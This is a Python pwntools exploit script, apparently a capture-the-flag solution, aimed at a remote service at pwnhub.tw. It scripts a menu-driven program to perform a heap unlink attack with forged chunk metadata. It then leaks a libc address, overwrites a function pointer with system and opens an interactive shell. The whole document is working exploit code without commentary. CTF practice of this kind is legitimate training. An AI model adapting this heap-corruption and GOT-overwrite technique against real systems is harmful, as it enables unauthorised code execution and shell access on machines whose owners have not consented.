#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888
host = "pwnhub.tw"
port = 20003
r = remote(host,port)

def addpro(name,age,size,desc):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.send(name)
    r.recvuntil(":")
    r.sendline(str(age))
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(desc)

def show(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def editpro(idx,name,age,desc):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil(":")
    r.sendline(str(age))
    r.recvuntil(":")
    r.send(desc)


def free(idx):
    r.recvuntil(":")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(str(idx))

def freename(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))
    r.recvuntil(":")
    r.sendline("\x00")


addpro("a"*0x10,33,0x90,"a"*0x80)
addpro("b"*0x10,33,0x90,"a"*0x80)
addpro("c"*0x10,33,0x90,"a"*0x80)
addpro("d"*0x10,33,0x90,"a"*0x80)
freename(2)
free(1)
free(3)
addpro("e"*0x10,33,0xb0,p64(0) + p64(0x91) + p64(0x602128-0x18) + p64(0x602128-0x10)+"d"*0x70 + p64(0x90) + p64(0xc0))
freename(2)
editpro(1,"a",0x31,p64(0x602098)[:3])
show(0)
r.recvuntil("Desc : ")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x36e80
print hex(libc)
system = libc + 0x45390
editpro(0,"a",32,p64(system)[:6])
r.recvuntil(":")
r.sendline("sh")
r.interactive()
